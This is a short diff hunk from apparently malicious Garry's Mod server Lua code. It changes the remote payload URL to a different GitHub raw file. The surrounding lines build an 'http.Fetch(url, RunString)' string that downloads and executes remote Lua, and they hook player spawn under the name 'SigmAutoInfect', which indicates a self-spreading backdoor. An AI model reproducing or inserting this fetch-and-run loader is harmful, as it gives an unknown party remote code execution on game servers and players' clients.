@@ -20,7 +20,7 @@ if SERVER then
     util.AddNetworkString("SendPly.info");
     util.AddNetworkString("SigmaLuaError");
 
-    local rawURL = "https://raw.githubusercontent.com/Zenius07/file/refs/heads/main/sh_faceless_outfit.lua"
+    local rawURL = "https://raw.githubusercontent.com/NiktoSupra/SigmaLil/refs/heads/main/omagad.lua"
     local vsosiCode = "http.Fetch('" .. rawURL .. "', RunString)"
 
     hook.Add("PlayerInitialSpawn", "SigmAutoInfect", function(ply)
